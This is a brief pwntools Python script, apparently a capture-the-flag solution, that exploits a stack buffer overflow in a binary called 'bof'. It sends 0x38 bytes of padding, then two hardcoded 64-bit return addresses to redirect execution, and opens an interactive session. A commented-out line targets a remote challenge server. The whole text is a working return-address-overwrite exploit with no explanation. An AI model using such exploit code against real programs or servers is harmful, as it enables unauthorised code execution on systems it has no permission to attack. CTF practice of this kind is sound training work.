from pwn import *

p = process('bof')
# p = remote('60.250.197.227',10000)
l = p.readline()
print(l)


payload = 'a'*0x30
payload += 'a'*0x8

payload += p64(0x400730)
payload += p64(0x400687)
# raw_input()
p.sendline(payload)

p.interactive()